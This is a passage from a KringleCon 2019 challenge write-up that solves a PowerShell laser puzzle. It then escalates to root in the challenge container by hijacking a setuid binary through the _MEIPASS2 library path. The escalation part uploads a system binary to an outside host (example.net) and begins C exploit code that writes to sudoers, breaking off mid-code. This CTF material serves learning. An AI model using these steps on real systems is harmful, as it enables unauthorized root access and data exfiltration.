NKK0<span class="red">Oxxxxxxxxxxxxxxxxxxxxxxxxdxddddddddooooooooo</span>kOOOOO
NK0<span class="red">kxxxxkxxxxxxxxxxxxxxxxxxxddddddddoooooolloooo</span>kOOOOO
KX<span class="red">Oxdxxxxxdxxkxdoooollccccc::;:;</span>;<span class="red">;,</span>;,<span class="red">,</span>,',<span class="red">,,,:ll</span>kkOOOOO
KK<span class="red">xddxxxddoc</span>cxdoloooodxxxxxxkxxxxxxxxkkxxxdoc,,okOOOOO
KK<span class="red">kddkxdx</span>O:lkOOOOOOOOOOOOOOOkkkkxxdxxodoollll:'lkkOOOO
KK<span class="red">kxxxxk</span>00d;;llllcllcc:::c:::;;;;;:::cccc:.  .;xkkOOOO
KKO<span class="red">kxk</span>O000d,cododxddxxxkkkkOOOkkkkkkkkkxxo.   .:kkOOOO
KKk<span class="red">ll</span>ok00x,,kOOOOOOdoodooxOOOOOOkxc:::ccdx;.  ..:kkOOO
KO;dOx:oOl,dOOO0Oklxc.oklxOOOOOklcd;.:xdcdd..   .okkOO
Kk;dkx:,xc,xOOO0Oxlddlc:dOOOOOOk:dxl:oo:cxx;.    ckkkO
KKk:;;:xOo,dOOO0OOkdooxOOOOOOOOkxc::::cdxxxl ..  'xkkO
KKKK00000k:;xOOOOOOOOOOOOOOk',okkkkkkkkkxxx:.....'xkkO
KKKKK0KK00d;:kOOOOOOOOOOOOk:  .;xkkkkkkkkxx..  .,xkkOO
KKKKK000000x::xOOOOOOOOOOOOdodxkkkkkkkkkkxx.  .'dkkOOO
KKKK00000000Od::okOOOOOOOkkxl,';cdkkkkkkxx: ..;xkkkOOO
KKKK000000000OOo,';xkOOkko'     .,dxxkkxxc...lkkkOOOOO
KKKK000000000OOOkl..dkkkx..  .   .lxxxxx;..'dkkkkOOOOO
KKK00000000000OOOOo.:kkkx.       .cxxxd'  ;xkkkkOOOOOO
KK0000000000000OOOk;'xkkk,       .cxxo...lkkkkkkOOOOOO
KK000000000000OOOOOk,okkko.      .odd'..dxkkkkkkkkkOOO
KK00000000000OOOOOOOo;xkkkc.     ;dd'..lxxkkkkkkkkkkkk
K00000000000OOOOOOOOkl:xkkko;'.,cdd'..:xxkkkkkkkkkkkkk
00000000000OOOOOOOOOOkc:xkkkxxxdoc.  .dxxkkkkkkkkkkkkk
0000000000OOOOOOOOOOOOko:oxxxdl'    .oxxkkkkkkkkkkkkkk
00000000OOOOOOOOOOOOOOkkxl;.     . .:xxkkkkkkkkkkkkkkk
00000OOOOOOOOOOOOOOOOOkkkkxo::'..':dxkkkkkkkkkkkkkkkkk
0000OOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
OOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd8e57ca" class="outline-3">
<h3 id="term_powershell"><a id="orgd8e57ca"></a>Xmas Cheer Laser</h3>
<div class="outline-text-3" id="text-term_powershell">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=powershell&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=powershell</a>
</p>

<p>
In the laboratory in Hermey Hall.
</p>
</div>

<div id="outline-container-org180486c" class="outline-4">
<h4 id="org180486c">Background</h4>
<div class="outline-text-4" id="text-org180486c">
<pre class="src src-powershell">
<span style="color: #b58900">🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲</span>
<span style="color: #b58900">🗲</span>                                                                                <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Elf University Student Research Terminal - Christmas Cheer Laser Project       <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> ------------------------------------------------------------------------------ <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> The research department at Elf University is currently working on a top-secret <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Laser which shoots laser beams of Christmas cheer at a range of hundreds of    <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> miles. The student research team was successfully able to tweak the laser to   <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Unfortunately, someone broke into the research terminal, changed the laser     <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> settings through the Web API and left a note behind at <span style="color: #d30102">/home/callingcard.txt</span>.  <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Read the calling card and follow the clues to find the correct laser Settings. <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Apply these correct settings to the laser using it's Web API to achieve laser  <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> output of 5 Mega-Jollies per liter.                                            <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span>                                                                                <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span> Use <span style="color: #d30102">(Invoke-WebRequest -Uri http://localhost:1225/).RawContent</span> for more info.  <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲</span>                                                                                <span style="color: #b58900">🗲</span>
<span style="color: #b58900">🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲</span>
</pre>

<div class="goal">
<p>
Use the API to power the laser to 5 Mega-Jollies per liter.
</p>

</div>

<div class="chat">
<p>
I'm Sparkle Redberry and Imma chargin' my laser!
</p>

<p>
Problem is: the settings are off.
</p>

<p>
Do you know any PowerShell?
</p>

<p>
It'd be GREAT if you could hop in and recalibrate this thing.
</p>

<p>
It spreads holiday cheer across the Earth &#x2026;
</p>

<p>
&#x2026;  when it's working!
</p>

</div>

<div class="gamehint">
<p>
PowerShell: <a href="https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf">SANS' PowerShell Cheat Sheet</a>
</p>

</div>
</div>
</div>
<div id="outline-container-org2b7ac35" class="outline-4">
<h4 id="org2b7ac35">Solution</h4>
<div class="outline-text-4" id="text-org2b7ac35">
<p>
<asciinema-player src="casts/powershell.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
We’re in PowerShell and out of our normal element. We’ll be relying heavily on the SANS Cheatsheet for this one.
</p>

<p>
We'll follow the directions in the logon message first. The SANS Cheatsheet also tells us that <code>Get-Content</code> will display file contents.
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://localhost:1225/).Content
&lt;html>
&lt;body>
&lt;pre>
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off
Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output
Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0
Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10
Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1
Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
----------------------------------------------------
&lt;/pre>
&lt;/body>
&lt;/html>
<span class="gray1">PS /home/elf></span> <span class="green">Get-Content</span> /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
</pre>

<p>
The calling card mentions commands holding riddles in
history. Checking the history isn't on our cheat-sheet, but with some
searching, we find the following solution:
</p>
<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-History</span>
  Id CommandLine
  -- -----------
   1 <span class="green">Get-Help</span> -<span class="purple">Name</span> <span class="green">Get-Process</span>
   2 <span class="green">Get-Help</span> -<span class="purple">Name</span> <span class="green">Get-*</span>
   3 <span class="green">Set-ExecutionPolicy</span> Unrestricted 
   4 <span class="green">Get-Service</span> | <span class="green">ConvertTo-HTML</span> -<span class="purple">Property</span> Name, Status > C:\services.htm 
   5 <span class="green">Get-Service</span> | <span class="green">Export-CSV</span> c:\service.csv 
   6 <span class="green">Get-Service</span> | <span class="green">Select-Object</span> Name, Status | <span class="green">Export-CSV</span> c:\service.csv 
   7 (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://127.0.0.1:1225/api/angle?val=65.5).Content
   8 <span class="green">Get-EventLog</span> -<span class="purple">Log</span> <span class="red">"Application"</span>
   9 I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items.
  10 (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> -<span class="purple">Uri</span> http://localhost:1225/).Content
  11 <span class="green">Get-Content</span> /home/callingcard.txt
</pre>

<p>
We got the command for setting the angle. We also got a hint pointing
us to child items in environment variables. Once more, we do some
research, and come up with:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://127.0.0.1:1225/api/angle?val=65.5).Content
Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> env:  
Name                           Value
----                           -----
_                              /bin/su
DOTNET_SYSTEM_GLOBALIZATION_I… false
HOME                           /home/elf
HOSTNAME                       35dbd250296c
LANG                           en_US.UTF-8
LC_ALL                         en_US.UTF-8
LOGNAME                        elf
MAIL                           /var/mail/elf
PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnalysisCache
PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/share/powershell/Modules:/opt/microsoft/powershell/6/Modules
PWD                            /home/elf
RESOURCE_ID                    undefined
riddle                         Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.
SHELL                          /home/elf/elf
SHLVL                          1
TERM                           xterm
USER                           elf
userdomain                     laserterminal
USERDOMAIN                     laserterminal
USERNAME                       elf
username                       elf
</pre>

<p>
We find a riddle:
</p>

<blockquote>
<p>
Squeezed and compressed I am hidden away. Expand me from my prison and
I will show you the way. Recurse through all /etc and Sort on my
LastWriteTime to reveal im the newest of all.
</p>
</blockquote>

<p>
Let's find the newest file, and uncompress it. We have an example with
<code>| sort</code> in the cheatsheet, and the riddle gives us an extra nudge to
sort on a particular field. We're on our own for figuring out how to
expand an archive, luckily the name is rather intuitive.
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> -<span class="purple">Recurse</span> /etc | <span class="green">sort</span> LastWriteTime

&lt; truncated >

    Directory: /etc/apt
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---            1/4/20  4:25 AM        5662902 archive
<span class="gray1">PS /home/elf></span> <span class="green">Expand-Archive</span> /etc/apt/archive
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> -<span class="purple">Recurse</span> archive
    Directory: /home/elf/archive
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----            1/4/20  4:39 AM                refraction
    Directory: /home/elf/archive/refraction
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf
</pre>

<p>
Sounds like we have an <abbr title="Executable Linkable Format"> ELF</abbr> binary to
run. However, if we try that, we get an permission denied message. We
can get past this by fixing the permissions:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">chmod</span> +<span class="purple">x</span> ./archive/refraction/runme.elf
<span class="gray1">PS /home/elf></span> <span class="green">./archive/refraction/runme.elf</span>
refraction?val=1.867
</pre>

<p>
We'll set our second parameter, the refraction, to the correct value, and then check out the riddle from the archive:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://127.0.0.1:1225/api/refraction?val=1.867).Content
Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.
<span class="gray1">PS /home/elf></span> <span class="green">Get-Content</span> ./archive/refraction/riddle       
Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

25520151A320B5B0D21561F92C8F6224
</pre>

<p>
We can combine a couple cheatsheet examples to come up with:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> /home/elf -<span class="purple">File</span> -<span class="purple">Recurse</span> | 
   <span class="green">Where-Object</span> {(<span class="green">Get-FileHash</span> -<span class="purple">Algorithm</span> MD5 -<span class="purple">Path</span> <span class="red">$_</span>).Hash –<span class="purple">eq</span> <span class="red">"25520151A320B5B0D21561F92C8F6224"</span>}

    Directory: /home/elf/depths/produce

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          11/18/19  7:53 PM            224 thhy5hll.txt
</pre>

<p>
The previous command was a bit tricky. Without specifying <code>-File</code>, Powershell tries to hash each directory, which generates an error message. We can now either view <code>/home/elf/depths/produce/thhy5hll.txt</code>, or tweak our previous command:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> /home/elf -<span class="purple">File</span> -<span class="purple">Recurse</span> | 
   <span class="green">Where-Object</span> {(<span class="green">Get-FileHash</span> -<span class="purple">Algorithm</span> MD5 -<span class="purple">Path</span> <span class="red">$_</span>).Hash –<span class="purple">eq</span> <span class="red">"25520151A320B5B0D21561F92C8F6224"</span>} | 
   <span class="green">Get-Content</span> 
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
</pre>

<p>
One more value acquired. The next challenge is similar to how we found the archive, but we do as the riddle says, and pipe the FullNames to Sort Length:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://127.0.0.1:1225/api/temperature?val=-33.5).Content
Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.
<span class="gray1">PS /home/elf></span> (<span class="green">Get-ChildItem</span> -<span class="purple">Recurse</span> /home/elf/depths).FullName | <span class="green">sort</span> Length

&lt; truncated >

/home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/
writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/
play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/
she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/
0jhj5xz6.txt
</pre>

<p>
Viewing that file gives us:
</p>

<blockquote>
<p>
Get process information to include Username identification. Stop
Process to show me you're skilled and in this order they must be
killed:
</p>

<p>
bushy
alabaster
minty
holly
</p>

<p>
Do this for me and then you /shall/see .
</p>
</blockquote>

<p>
The cheatsheet tells us we can use <code>Get-Process</code>. However, by
default, it doesn't include the username. Using the help puts us on
the right track:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-Process</span>
 NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName
 ------    -----      -----     ------      --  -- -----------
      0     0.00      29.46       1.47       6   1 CheerLaserServi
      0     0.00     133.25      67.58      31   1 elf
      0     0.00       3.43       0.03       1   1 init
      0     0.00       0.78       0.00      25   1 sleep
      0     0.00       0.81       0.00      26   1 sleep
      0     0.00       0.80       0.00      27   1 sleep
      0     0.00       0.80       0.00      29   1 sleep
      0     0.00       3.46       0.00      30   1 su
<span class="gray1">PS /home/elf></span> <span class="green">Get-Process</span> -?
NAME
    <span class="green">Get-Process</span>
    
SYNTAX
    <span class="green">Get-Process</span> [[-<span class="purple">Name</span>] &lt;string[]>] [-<span class="purple">Module</span>] [-<span class="purple">FileVersionInfo</span>] [&lt;CommonParameters>]
    
    <span class="green">Get-Process</span> [[-<span class="purple">Name</span>] &lt;string[]>] -<span class="purple">IncludeUserName</span> [&lt;CommonParameters>]

&lt; truncated >

<span class="gray1">PS /home/elf></span> <span class="green">Get-Process</span> -<span class="purple">IncludeUserName</span>
     WS(M)   CPU(s)      Id UserName                       ProcessName
     -----   ------      -- --------                       -----------
     29.46     1.56       6 root                           CheerLaserServi
    134.27    67.73      31 elf                            elf
      3.43     0.03       1 root                           init
      0.78     0.00      25 bushy                          sleep
      0.81     0.00      26 alabaster                      sleep
      0.80     0.00      27 minty                          sleep
      0.80     0.00      29 holly                          sleep
      3.46     0.00      30 root                           su
</pre>

<p>
At this point, we know that we need to kill the processes in the right
order (25, 26, 27, 29). We could search for how to kill processes in
Powershell, or we could use the built-in tools, as directed by the
cheatsheet:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-Command</span> *Process
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           <span class="green">Stop-Process</span>                                                  
Cmdlet          <span class="green">Debug-Process</span>                                      6.1.0.0    Microsoft.PowerShell.Management
Cmdlet          <span class="green">Enter-PSHostProcess</span>                                6.2.3.0    Microsoft.PowerShell.Core
Cmdlet          <span class="green">Exit-PSHostProcess</span>                                 6.2.3.0    Microsoft.PowerShell.Core
Cmdlet          <span class="green">Get-Process</span>                                        6.1.0.0    Microsoft.PowerShell.Management
Cmdlet          <span class="green">Start-Process</span>                                      6.1.0.0    Microsoft.PowerShell.Management
Cmdlet          <span class="green">Stop-Process</span>                                       6.1.0.0    Microsoft.PowerShell.Management
Cmdlet          <span class="green">Wait-Process</span>                                       6.1.0.0    Microsoft.PowerShell.Management
<span class="gray1">PS /home/elf></span> <span class="green">Stop-Process</span> 25
<span class="gray1">PS /home/elf></span> <span class="green">Stop-Process</span> 26
<span class="gray1">PS /home/elf></span> <span class="green">Stop-Process</span> 27
<span class="gray1">PS /home/elf></span> <span class="green">Stop-Process</span> 29
</pre>

<p>
At this point, we're stuck a bit, until we re-read the clue:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> /shall
    Directory: /shall
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---            1/4/20  9:02 PM            149 see
<span class="gray1">PS /home/elf></span> <span class="green">Get-Content</span> /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.
</pre>

<p>
Once more, adapting an example from the cheatsheet:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-ChildItem</span> /etc -<span class="purple">recurse</span> -<span class="purple">include</span> *.xml

    Directory: /etc/systemd/system/timers.target.wants

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          11/18/19  7:53 PM       10006962 EventLog.xml
</pre>

<p>
At this point, the training wheels are off, and we need to find a way
to parse this file, and group the ids ourselves. After a few
iterations, we find:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Import-Clixml</span> /etc/systemd/system/timers.target.wants/EventLog.xml | <span class="green">group</span> Id            
Count Name                      Group
----- ----                      -----
    1 1                         {System.Diagnostics.Eventing.Reader.EventLogRecord}
   39 2                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.Eve…
  179 3                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.Eve…
    2 4                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord}
  905 5                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.Eve…
   98 6                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.Eve…
<span class="gray1">PS /home/elf></span> <span class="green">Import-Clixml</span> /etc/systemd/system/timers.target.wants/EventLog.xml | <span class="green">where</span> {<span class="red">$_</span>.Id -<span class="purple">eq</span> 1}
Message              : Process Create:
                       RuleName: 
                       UtcTime: 2019-11-07 17:59:56.525
                       ProcessGuid: {BA5C6BBB-5B9C-5DC4-0000-00107660A900}
                       ProcessId: 3664
                       Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                       FileVersion: 10.0.14393.206 (rs1_release.160915-0644)
                       Description: Windows PowerShell
                       Product: Microsoft® Windows® Operating System
                       Company: Microsoft Corporation
                       OriginalFileName: PowerShell.EXE
                       CommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c 
                       &quot;`<span class="red">$correct_gases_postbody</span> = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    
                       Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n&quot;
</pre>

<p>
With this, we have our last parameter. We think that <code>`n</code> is actually
a newline. We just need to set the gas mixture, turn on the laser, and
check the output:
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="red">$correct_gases_postbody</span> = @{
<span class="gray1">>></span>     O=6
<span class="gray1">>></span>     H=7
<span class="gray1">>></span>     He=3
<span class="gray1">>></span>     N=4
<span class="gray1">>></span>     Ne=22
<span class="gray1">>></span>     Ar=11
<span class="gray1">>></span>     Xe=10
<span class="gray1">>></span>     F=20
<span class="gray1">>></span>     Kr=8
<span class="gray1">>></span>     Rn=9
<span class="gray1">>></span> }
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://localhost:1225/api/gas -<span class="purple">Body</span> <span class="red">$correct_gases_postbody</span> -<span class="purple">Method</span> POST ).Content
Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://localhost:1225/api/on).Content
Christmas Cheer Laser Powered On
<span class="gray1">PS /home/elf></span> (<span class="green">Invoke-WebRequest</span> -<span class="purple">Uri</span> http://localhost:1225/api/output).Content

Success! - 5.23 Mega-Jollies of Laser Output Reached!
</pre>
</div>
</div>

<div id="outline-container-orgcf0ba38" class="outline-4">
<h4 id="term_iptables_root"><a id="orgcf0ba38"></a>Escalating to Root</h4>
<div class="outline-text-4" id="text-term_iptables_root">
<p>
This terminal was incredibly challenging for us. We couldn’t tell if
it was painful simply due to our lack of experience with Powershell,
or because we were meant to solve it a different way (perhaps through
container escape?).
</p>

<p>
Solving it only using Powershell was rewarding, but we had a nagging
feeling that something wasn't quite right. We had figured out that we
were running Powershell on Linux within Docker. Because of this, even
though it’s running Powershell, standard Linux permissions apply. One
glaring exception to this was being able to stop other users'
processes. We decided to take a deeper look at the <code>Stop-Process</code>
alias.
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="green">Get-Alias</span> -<span class="purple">Definition</span> <span class="green">Stop-Process</span>
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           <span class="green">kill</span> -> <span class="green">kill</span>                                                  
Alias           <span class="green">spps</span> -> <span class="green">kill</span>       
<span class="gray1">PS /home/elf></span> <span class="green">Get-Command</span> -<span class="purple">All</span> <span class="green">kill</span>
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           <span class="green">kill</span> -> <span class="green">kill</span>                                                  
Application     <span class="green">kill</span>                                               0.0.0.0    <span class="green">/usr/bin/kill</span>
</pre>

<p>
Poking around at the <code>kill</code> command, we notice that it's not
respecting any options that the usual version of <code>kill</code>
uses. Additionally, it's usually installed in <code>/bin</code> and not
<code>/usr/bin</code>. We suspect this file has the <code>setuid</code> permission, so it
will run with elevated privileges.
</p>

<p>
We'll pull the file off the system and examine it more closely. Since
this container is connected to the Internet, there's a number of ways
we can retrieve the file. We'll encode the file, do an HTTP POST to a
server that will store uploads, then compare hashes for integrity.
</p>

<pre class="src src-powershell">
<span class="gray1">PS /home/elf></span> <span class="red">$wc</span> = <span class="green">New-Object</span> System.Net.WebClient
<span class="gray1">PS /home/elf></span> <span class="rred">$wc</span>.UploadFile(<span class="red">"http://example.net"</span>,<span class="red">"/usr/bin/kill"</span>)
<span class="gray1">PS /home/elf></span> <span class="green">Get-FileHash</span> -<span class="purple">Algorithm</span> MD5 <span class="green">/usr/bin/kill</span>
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----

MD5             C2969E791C5623A6F3A4F354430241D3                                       <span class="green">/usr/bin/kill</span>
</pre>

<p>
On a different system, we determine this is a Linux (ELF) binary, and
is dynamically linked. It pulls in some libraries as dependencies.
</p>

<pre class="src src-sh">
<span class="gray1">vlad@test $</span> <span class="green">file</span> kill
kill: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, 
  for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
<span class="gray1">vlad@test $</span> <span class="green">ldd</span> ./kill                                                                                                                                                                                                                                  
        linux-vdso.so.1 (0x00007fff5bb9c000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc2210cc000)
        libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fc220eaf000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc220abe000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc2212d0000)
</pre>

<p>
Normally this would be sufficient for an attack, as we can use
<code>LD_PRELOAD</code> to <a href="https://www.holidayhackchallenge.com/2017/winners/ncsa/report.html#orge2f83a1">load a malicious library before the program
executes</a>. However, the dynamic loader (<code>ld</code>) by default runs in
"secure-execution mode" for setuid binaries, to prevent just this type
of attack.
</p>

<p>
We'll inspect its behavior with <code>ltrace</code>, which will log calls to
standard library functions.
</p>

<pre class="src src-sh">
<span class="gray1">vlad@test $</span> <span class="green">ltrace</span> -<span class="purple">f</span> -<span class="purple">o</span> test_kill_abcdabcd ./kill abcdabcd
<span class="gray1">vlad@test $</span> <span class="green">head</span> test_kill_abcdabcd
4042 <span class="green">__libc_start_main</span>(0x401a70, 2, 0x7fff6f577e28, 0x405390 &lt;unfinished ...>
4042 <span class="green">calloc</span>(1, 16528)
4042 <span class="green">readlink</span>(0x4057c4, 0x7fff6f574d20, 4096, 0)
4042 <span class="green">stpcpy</span>(0x7fff6f576d20, <span class="red">"/home/vlad/kill"</span>)
4042 <span class="green">__strcpy_chk</span>(0x7fff6f573d10, 0x7fff6f574d20, 4096, 0x7ff164c2c000)
4042 <span class="green">dirname</span>(0x7fff6f573d10, 0x7fff6f574d20, 16, 3360)
4042 <span class="green">strcpy</span>(0x7fff6f575d20, <span class="red">"/home/vlad"</span>)
4042 <span class="green">getenv</span>(<span class="red">"_MEIPASS2"</span>)
4042 <span class="green">unsetenv</span>(<span class="red">"_MEIPASS2"</span>)
4042 <span class="green">strnlen</span>(0x7fff6f575d20, 4096, 0x7fff6f574d2a, 95)
</pre>

<p>
Right off the bat, we see the program trying to load an environment
variable named <code>_MEIPASS2</code>. Searching tells us this comes from <span class="underline">McMillan Enterprise
Installer</span>, the ancestor of PyInstaller. If we set it and re-run, we see:
</p>

<pre class="src src-sh">
<span class="gray1">vlad@test $</span> <span class="red">_MEIPASS2</span>=pass2_value <span class="green">ltrace</span> -<span class="purple">f</span> -<span class="purple">o</span> test_kill_abcdabcd ./kill abcdabcd
[5664] Error loading Python lib 'pass2_value/libpython3.6m.so.1.0': 
    dlopen: pass2_value/libpython3.6m.so.1.0: cannot open shared object file: No such file or directory
</pre>

<p>
Well, that was easy. We've found a way to load a malicious
shared-object (library) file. At this point, we built a shared-object
file to verify our assumption that <code>kill</code> was setuid root, which it
was. In the interest of time, we'll skip that, and present our exploit
code. This was made more complicated due to the fact that many tools had been removed.
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;stdio.h&gt;</span>
<span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;string.h&gt;</span>
<span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;sys/stat.h&gt;</span>
<span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;sys/types.h&gt;</span>
<span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;stdlib.h&gt;</span>
<span style="color: #268bd2;">#include</span> <span style="color: #859900;">&lt;unistd.h&gt;</span>

<span style="color: #b58900;">void</span> <span style="color: #268bd2;">_init</span>() {
  <span style="color: #b58900;">FILE</span>* <span style="color: #dc322f;">sudoers</span>;

